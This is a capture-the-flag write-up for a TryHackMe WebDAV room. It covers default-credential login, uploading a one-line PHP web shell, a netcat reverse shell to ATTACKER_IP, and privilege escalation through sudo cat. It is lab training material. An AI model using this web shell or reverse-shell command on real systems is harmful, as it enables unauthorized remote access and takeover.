## Summary
This is a writeup for the box posted by TryHackMe and can be found on https://tryhackme.com/r/room/bsidesgtdav. It is a simple boot2root box which requires some enumeration online to discover default credentials, after gaining said credentials, the cadaver tool is used to insert a backdoor php file which grants access to the box as the www-data user who can then subsequently escalate their privileges through the "cat" binary

### Nmap Scan
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### Initial Access
Default apache index.html found on Web server, there were no hidden comments found when inspecting the webpage.
![Dav-20241105130756280](https://github.com/user-attachments/assets/3e99da61-a36f-4ea7-9e59-fb4bd1f9601c)



Running gobuster on the web server to check for hidden directories shows the directory /webdav
![Dav-20241105130527407](https://github.com/user-attachments/assets/d9612549-24be-4a98-8751-37203c3e2ffc)


After viewing the directory `/webdav` there is a prompt for a username and password, searching online for default credentials for the webdav login, this [site](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) displayed the default credentials required to log in.
![Dav-20241105130649817](https://github.com/user-attachments/assets/3e57a3e8-6577-4e66-bd79-a632d7a28fc4)



Directory listing shows a possible password file which is uncrackable
![Dav-20241105131144223](https://github.com/user-attachments/assets/00d8b1f8-07e9-4e34-ba59-c29e7664ef50)


Using the cadaver tool to login, a simple backdoor php file can be placed in the webdav directory and then executed to access the system.

![Dav-20241105131239357](https://github.com/user-attachments/assets/1b579138-4145-48a4-97c7-f1040fe0e6e1)




Content of backdoor.php:
```php
<?php
echo system($_GET['cmd']);
?>
```

Successful remote code execution!
![Dav-20241105131501800](https://github.com/user-attachments/assets/3accc6e3-6e49-472f-8382-b5932df74dd0)


To gain a reverse shell set up a listener on the attacker box using  `nc -lvnp 9001` and on the backdoor.php file use the command `busybox nc ATTACKER_IP 9001 -e sh`

Successful reverse shell connection!

![Dav-20241105131651850](https://github.com/user-attachments/assets/dc47b028-1c0f-4a20-918b-35644540aa11)



I use these commands to stabilize my shell after receiving a reverse shell connection
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
 Background the connection by pressing CTRL+Z
stty raw -echo; fg
export TERM=xterm
```


After initial access, the www-data user can read the first file located in merlin's home directory
![Dav-20241105132215602](https://github.com/user-attachments/assets/ab3b1584-1fad-43ef-9afb-cf9d4e1174d8)


### Privilege Escalation

![Dav-20241105131848070](https://github.com/user-attachments/assets/4947c2ac-ef15-4d7e-8de8-fec7ffdfc12e)

Running `sudo -l` shows that the www-data user can use the binary cat to read any file, this allows root.txt to be read using `sudo /bin/cat /root/root.txt` !
